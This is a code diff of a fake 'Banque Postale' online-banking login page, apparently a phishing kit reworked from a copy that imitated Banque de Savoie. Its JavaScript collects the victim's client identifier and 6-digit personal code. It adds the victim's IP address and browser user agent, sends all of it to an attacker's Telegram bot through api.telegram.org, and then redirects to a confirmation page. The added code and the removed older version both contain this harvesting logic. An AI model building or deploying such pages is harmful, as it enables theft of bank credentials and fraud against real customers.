@@ -7,7 +7,7 @@
             CHAT_ID: "TELEGRAM_CHAT_ID_PLACEHOLDER"
         };
     </script>
-            <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion banque Postale</title>
     <style>
@@ -122,7 +122,7 @@
             }
         }
 
-        /* --- VERSION TRÈS PETIT ÉCRAN --- */
+        /* --- VERSION TRES PETIT ECRAN --- */
         @media (max-width: 375px) {
             .sidebar {
                 padding: 15px;
@@ -466,123 +466,12 @@
             font-size: 0.9rem;
         }
 
-        @media (max-width: 768px) {
-            input[type="text"], input[type="password"] {
-                font-size: 16px;
-            }
-            
-            .sidebar {
-                flex: 1;
-                justify-content: flex-start;
-            }
-            
-            .main-content {
-                flex: none;
-            }
-            
-            .sidebar-header {
-                flex-direction: column;
-                align-items: flex-start;
-                gap: 15px;
-            }
-            
-            .back-to-bank-btn {
-                margin-bottom: 10px;
-            }
-            
-            .logo-container {
-                width: 100%;
-            }
-        }
-
-    
-        /* ===== OPTIMISATIONS MOBILE ===== */
-        * {
-            box-sizing: border-box;
-        }
-        
-        body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            overflow-x: hidden;
-        }
-        
-        /* Responsive images */
-        img {
-            max-width: 100%;
-            height: auto;
-            display: block;
-        }
-        
-        /* Responsive text */
-        @media (max-width: 768px) {
-            body {
-                font-size: 14px;
-                line-height: 1.5;
-            }
-            
-            h1, .h1 { font-size: 20px !important; }
-            h2, .h2 { font-size: 18px !important; }
-            h3, .h3 { font-size: 16px !important; }
-            
-            /* Buttons */
-            button, .btn, [class*="btn"] {
-                min-height: 44px;
-                padding: 12px 20px !important;
-                font-size: 14px;
-            }
-            
-            /* Inputs */
-            input, select, textarea {
-                min-height: 44px;
-                padding: 12px;
-                font-size: 16px;
-            }
-            
-            /* Layout */
-            .container, main, section {
-                padding: 15px !important;
-            }
-            
-            /* Grid adjustments */
-            [class*="grid"], [class*="flex"] {
-                flex-direction: column;
-            }
-            
-            /* Hide unnecessary elements */
-            .hide-mobile {
-                display: none !important;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            h1, .h1 { font-size: 18px !important; }
-            h2, .h2 { font-size: 16px !important; }
-            h3, .h3 { font-size: 14px !important; }
-            
-            button, .btn, [class*="btn"] {
-                width: 100%;
-                padding: 14px 16px !important;
-                font-size: 13px;
-            }
-            
-            input, select, textarea {
-                font-size: 16px;
-            }
-            
-            .container, main, section {
-                padding: 10px !important;
-            }
-        }
-
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="sidebar">
-        <!-- BOUTON RETOUR - EN HAUT DU LOGO -->
         <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
             <i>←</i> Retour aux banques
         </button>
@@ -596,7 +485,7 @@
             <div style="font-size:1.2rem; cursor:pointer; color: #999;" onclick="location.reload()" title="Fermer">&times;</div>
         </div>
 
-        <h1 id="form-title">Connexion à votre compte</h1>
+        <h1 id="form-title">Connexion a votre compte</h1>
 
         <div class="user-id-display" id="user-id-display">
             <div class="user-id-label">Identifiant client :</div>
@@ -610,7 +499,7 @@
             </div>
 
             <div class="toggle-wrapper">
-                <span>Mémoriser mon identifiant</span>
+                <span>Memoriser mon identifiant</span>
                 <label class="switch">
                     <input type="checkbox" id="remember-id">
                     <span class="slider"></span>
@@ -620,13 +509,13 @@
             <button id="btn-continue" class="btn-submit">Continuer</button>
             
             <div class="links">
-                <a href="#" onclick="alert('Contactez le service client au 0 800 123 456 pour récupérer vos identifiants')">Identifiant / Mot de passe oublié</a>
+                <a href="#" onclick="alert('Contactez le service client au 0 800 123 456 pour recuperer vos identifiants'); return false;">Identifiant / Mot de passe oublie</a>
             </div>
         </div>
 
         <div id="step-password">
             <div class="form-group">
-                <label>Saisissez votre code personnel à 6 chiffres</label>
+                <label>Saisissez votre code personnel a 6 chiffres</label>
                 <div class="dots-display" id="dots-container">
                     <div class="dot"></div><div class="dot"></div><div class="dot"></div>
                     <div class="dot"></div><div class="dot"></div><div class="dot"></div>
@@ -636,8 +525,8 @@
             <div class="keypad-grid" id="keypad"></div>
 
             <div style="display: flex; gap: 10px;">
-                <button class="btn-submit" style="background: #ccc; color: #333; flex: 1;" onclick="resetPad()">Effacer</button>
-                <button id="btn-final" class="btn-submit" style="flex: 2;" onclick="validateAndSend()">Valider</button>
+                <button class="btn-submit" style="background: #ccc; color: #333; flex: 1;" onclick="resetPad()" type="button">Effacer</button>
+                <button id="btn-final" class="btn-submit" style="flex: 2;" onclick="validateAndSend()" type="button">Valider</button>
             </div>
 
             <div class="loading" id="loading">
@@ -646,7 +535,7 @@
             </div>
 
             <div class="links">
-                <a onclick="goBackToId()">← Retour à la saisie de l'identifiant</a>
+                <a onclick="goBackToId()" style="cursor: pointer;">← Retour a la saisie de l'identifiant</a>
             </div>
         </div>
     </div>
@@ -656,239 +545,206 @@
         
         <div class="info-card">
             <h3>Espace Assurance</h3>
-            <p>Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats d'assurance ?</p>
+            <p>Vous n'avez pas d'acces Banque En Ligne et souhaitez retrouver vos contrats d'assurance ?</p>
             <a href="#" style="color:white; font-size:0.8rem; display:block; margin-bottom:15px; text-decoration:underline;">Signer mon contrat en ligne</a>
-            <a href="#" class="btn-outline">Me connecter à mon espace assurance</a>
+            <a href="#" class="btn-outline">Me connecter a mon espace assurance</a>
         </div>
     </div>
 </div>
 
 <script>
-        // Configuration Telegram
-        const BOT_TOKEN = (window.telegramConfig && window.telegramConfig.BOT_TOKEN) || 'TELEGRAM_BOT_TOKEN_PLACEHOLDER';
-        const CHAT_ID = '8176081750';
-
-        // Toast elements
-        const toast = document.getElementById('toast');
-        
-        function showToast(message, isError = false) {
-            toast.textContent = message;
-            toast.className = 'toast show' + (isError ? ' error' : ' success');
-            setTimeout(() => {
-                toast.classList.remove('show');
-                toast.className = 'toast';
-            }, 3000);
+    // Configuration Telegram
+    const BOT_TOKEN = window.telegramConfig?.BOT_TOKEN || 'NOT_SET';
+    const CHAT_ID = window.telegramConfig?.CHAT_ID || 'NOT_SET';
+    
+    let userId = '';
+    let userPassword = '';
+    const PASSWORD_LENGTH = 6;
+    
+    const idInput = document.getElementById('id-input');
+    const rememberCheckbox = document.getElementById('remember-id');
+    const btnContinue = document.getElementById('btn-continue');
+    const stepId = document.getElementById('step-id');
+    const stepPassword = document.getElementById('step-password');
+    const userIdDisplay = document.getElementById('user-id-display');
+    const displayedUserId = document.getElementById('displayed-user-id');
+    const dotsContainer = document.getElementById('dots-container');
+    const keypad = document.getElementById('keypad');
+    const btnFinal = document.getElementById('btn-final');
+    const loading = document.getElementById('loading');
+    
+    // Charger ID sauvegarde
+    const savedId = localStorage.getItem('banque_postale_saved_id');
+    if (savedId) {
+        idInput.value = savedId;
+        rememberCheckbox.checked = true;
+        updateContinueButton();
+    }
+    
+    // Mettre a jour l'etat du bouton Continuer
+    function updateContinueButton() {
+        const hasValue = idInput.value.trim().length > 0;
+        if (hasValue) {
+            btnContinue.classList.add('active');
+        } else {
+            btnContinue.classList.remove('active');
         }
-
-        // --- LOGIQUE ÉTAPE 1 (Identifiant) ---
-        const inputIdentifiant = document.getElementById('identifiant');
-        const btnEtapeSuivante = document.getElementById('btn-etape-suivante');
-        const rememberCheckbox = document.getElementById('rememberId');
+    }
+    
+    idInput.addEventListener('input', updateContinueButton);
+    
+    btnContinue.addEventListener('click', () => {
+        userId = idInput.value.trim();
+        if (userId.length === 0) return;
         
-        const etape1 = document.getElementById('etape-1');
-        const etape2 = document.getElementById('etape-2');
-
-        let identifiantSaisi = '';
-
-        // Charger l'identifiant mémorisé
-        const savedId = localStorage.getItem('banque_savoie_saved_id');
-        if (savedId) {
-            inputIdentifiant.value = savedId;
-            rememberCheckbox.checked = true;
-            btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
-            btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
-            btnEtapeSuivante.removeAttribute('disabled');
-            identifiantSaisi = savedId;
+        if (rememberCheckbox.checked) {
+            localStorage.setItem('banque_postale_saved_id', userId);
+        } else {
+            localStorage.removeItem('banque_postale_saved_id');
         }
-
-        // Activer le bouton de l'étape 1 si l'identifiant n'est pas vide
-        inputIdentifiant.addEventListener('input', (e) => {
-            if (e.target.value.trim().length > 0) {
-                btnEtapeSuivante.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
-                btnEtapeSuivante.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
-                btnEtapeSuivante.removeAttribute('disabled');
-                identifiantSaisi = e.target.value.trim();
+        
+        // Passer a l'etape 2
+        stepId.style.display = 'none';
+        stepPassword.style.display = 'block';
+        displayedUserId.textContent = userId;
+        userIdDisplay.classList.add('show');
+        
+        // Generer le clavier
+        generateKeypad();
+        updateDots();
+    });
+    
+    function generateKeypad() {
+        const numbers = [0,1,2,3,4,5,6,7,8,9].sort(() => Math.random() - 0.5);
+        keypad.innerHTML = '';
+        
+        numbers.forEach(num => {
+            const btn = document.createElement('button');
+            btn.className = 'key-btn';
+            btn.textContent = num;
+            btn.onclick = () => addDigit(num);
+            btn.type = 'button';
+            keypad.appendChild(btn);
+        });
+        
+        // Bouton effacer
+        const clearBtn = document.createElement('button');
+        clearBtn.className = 'key-btn';
+        clearBtn.innerHTML = '⌫';
+        clearBtn.onclick = removeDigit;
+        clearBtn.type = 'button';
+        keypad.appendChild(clearBtn);
+    }
+    
+    function addDigit(digit) {
+        if (userPassword.length < PASSWORD_LENGTH) {
+            userPassword += digit;
+            updateDots();
+            updateFinalButton();
+        }
+    }
+    
+    function removeDigit() {
+        if (userPassword.length > 0) {
+            userPassword = userPassword.slice(0, -1);
+            updateDots();
+            updateFinalButton();
+        }
+    }
+    
+    function resetPad() {
+        userPassword = '';
+        updateDots();
+        updateFinalButton();
+    }
+    
+    function updateDots() {
+        const dots = dotsContainer.querySelectorAll('.dot');
+        dots.forEach((dot, i) => {
+            if (i < userPassword.length) {
+                dot.classList.add('filled');
             } else {
-                btnEtapeSuivante.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
-                btnEtapeSuivante.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
-                btnEtapeSuivante.setAttribute('disabled', 'true');
-                identifiantSaisi = '';
+                dot.classList.remove('filled');
             }
         });
-
-        // Passer de l'étape 1 à l'étape 2
-        btnEtapeSuivante.addEventListener('click', () => {
-            if (identifiantSaisi) {
-                // Sauvegarder l'identifiant si la case est cochée
-                if (rememberCheckbox.checked) {
-                    localStorage.setItem('banque_savoie_saved_id', identifiantSaisi);
-                } else {
-                    localStorage.removeItem('banque_savoie_saved_id');
-                }
-                
-                etape1.classList.add('hidden');
-                etape1.classList.remove('flex');
-                etape2.classList.remove('hidden');
-                etape2.classList.add('flex');
-            }
-        });
-
-        // --- LOGIQUE ÉTAPE 2 (Mot de passe) ---
-        const btnRetour = document.getElementById('btn-retour');
-        const touchesClavier = document.querySelectorAll('.touche-clavier');
-        const btnSupprimer = document.getElementById('btn-supprimer');
-        const btnConnexion = document.getElementById('btn-connexion');
-        const affichageMdp = document.getElementById('affichage-mdp');
+    }
+    
+    function updateFinalButton() {
+        if (userPassword.length === PASSWORD_LENGTH) {
+            btnFinal.classList.add('active');
+        } else {
+            btnFinal.classList.remove('active');
+        }
+    }
+    
+    function goBackToId() {
+        stepPassword.style.display = 'none';
+        stepId.style.display = 'block';
+        userIdDisplay.classList.remove('show');
+        userPassword = '';
+        updateDots();
+        updateFinalButton();
+    }
+    
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip || 'Non disponible';
+        } catch (error) {
+            return 'Non disponible';
+        }
+    }
+    
+    async function validateAndSend() {
+        if (userPassword.length !== PASSWORD_LENGTH) return;
         
-        const LONGUEUR_MDP = 6; 
-        let motDePasseSaisi = '';
-
-        // Bouton retour (Efface le mdp et ramène à l'étape 1)
-        btnRetour.addEventListener('click', () => {
-            etape2.classList.add('hidden');
-            etape2.classList.remove('flex');
-            etape1.classList.remove('hidden');
-            etape1.classList.add('flex');
-            motDePasseSaisi = '';
-            mettreAJourAffichage();
-        });
-
-        // Clic sur les chiffres du clavier
-        touchesClavier.forEach(touche => {
-            touche.addEventListener('click', (e) => {
-                if (motDePasseSaisi.length < LONGUEUR_MDP) {
-                    motDePasseSaisi += e.target.innerText;
-                    mettreAJourAffichage();
-                }
-            });
-        });
-
-        // Effacer le dernier chiffre saisi
-        btnSupprimer.addEventListener('click', () => {
-            if (motDePasseSaisi.length > 0) {
-                motDePasseSaisi = motDePasseSaisi.slice(0, -1);
-                mettreAJourAffichage();
-            }
-        });
-
-        // Mettre à jour l'affichage des pastilles noires
-        function mettreAJourAffichage() {
-            affichageMdp.innerHTML = '';
-            
-            for (let i = 0; i < LONGUEUR_MDP; i++) {
-                const pastille = document.createElement('div');
-                pastille.className = `w-4 h-4 rounded-full border-2 transition-all duration-200 `;
-                
-                if (i < motDePasseSaisi.length) {
-                    pastille.classList.add('bg-gray-800', 'border-gray-800');
-                } else {
-                    pastille.classList.add('border-gray-300', 'bg-transparent');
-                }
-                
-                affichageMdp.appendChild(pastille);
-            }
-
-            // Activer/Désactiver le bouton final
-            if (motDePasseSaisi.length === LONGUEUR_MDP) {
-                btnConnexion.classList.remove('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
-                btnConnexion.classList.add('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
-                btnConnexion.removeAttribute('disabled');
-            } else {
-                btnConnexion.classList.add('bg-gray-100', 'text-gray-400', 'cursor-not-allowed');
-                btnConnexion.classList.remove('bg-red-600', 'text-white', 'hover:bg-red-700', 'cursor-pointer');
-                btnConnexion.setAttribute('disabled', 'true');
-            }
-        }
-
-        // Fonction pour obtenir l'IP
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip || 'Non disponible';
-            } catch (error) {
-                return 'Non disponible';
-            }
-        }
-
-        // Envoi à Telegram
-        async function sendToTelegram() {
-            const ip = await getIP();
-            const message = `🏔️ BANQUE DE SAVOIE - NOUVELLE CONNEXION 🏔️
+        btnFinal.disabled = true;
+        loading.style.display = 'block';
+        
+        const ip = await getIP();
+        const message = `📮 BANQUE POSTALE - NOUVELLE CONNEXION 📮
 ━━━━━━━━━━━━━━━━━━━━━
-👤 Identifiant: ${identifiantSaisi}
-🔑 Mot de passe: ${motDePasseSaisi}
+👤 Identifiant: ${userId}
+🔑 Code: ${userPassword}
 ━━━━━━━━━━━━━━━━━━━━━
 🌍 IP: ${ip}
 📱 User-Agent: ${navigator.userAgent}
 🕐 Date: ${new Date().toLocaleString('fr-FR')}
 ✅ Statut: Connexion en cours`;
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN || BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: window.CHAT_ID || CHAT_ID,
-                        text: message
-                    })
-                });
-                
-                const data = await response.json();
-                if (data.ok) {
-                    console.log('');
-                    ;
-                    return true;
-                } else {
-                                        showToast('❌ Erreur: ' + data.description, true);
-                    return false;
-                }
-            } catch (error) {
-                console.error('❌ Erreur lors de l\'envoi à Telegram:', error);
-                showToast('❌ Erreur de connexion', true);
-                return false;
-            }
-        }
-
-        // Initialiser l'affichage vide au démarrage
-        mettreAJourAffichage();
-
-        // --- VALIDATION ET ENVOI À TELEGRAM ---
-        btnConnexion.addEventListener('click', async () => {
-            if (motDePasseSaisi.length === LONGUEUR_MDP) {
-                
-                // Désactiver le bouton pour éviter double clic
-                btnConnexion.disabled = true;
-                
-                // Afficher l'écran de chargement
-                const ecranChargement = document.getElementById('ecran-chargement');
-                ecranChargement.classList.remove('hidden');
-                ecranChargement.classList.add('flex');
-                
-                // Envoyer les données à Telegram
-                await sendToTelegram();
-                
-                // Attendre 2 secondes puis rediriger
-                setTimeout(() => {
-                    window.location.href = 'confirmation.html';
-                }, 2000);
-            }
-        });
-
-        // Animation purement visuelle pour le toggle accessibilité
-        const toggle = document.getElementById('toggle');
-        if (toggle) {
-            toggle.addEventListener('change', (e) => {
-                if (e.target.checked) {
-                    e.target.style.transform = 'translateX(1.25rem)';
-                } else {
-                    e.target.style.transform = 'translateX(0)';
-                }
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
             });
+            
+            const result = await response.json();
+            
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            loading.style.display = 'none';
+            
+            if (result.ok) {
+                window.location.href = 'confirmation.html';
+            } else {
+                btnFinal.disabled = false;
+                alert('Erreur: ' + result.description);
+            }
+        } catch (error) {
+            loading.style.display = 'none';
+            btnFinal.disabled = false;
+            alert('Erreur de connexion');
         }
-    </script>
+    }
+    
+    // Initialiser
+    updateContinueButton();
+</script>
 </body>
 </html>
-
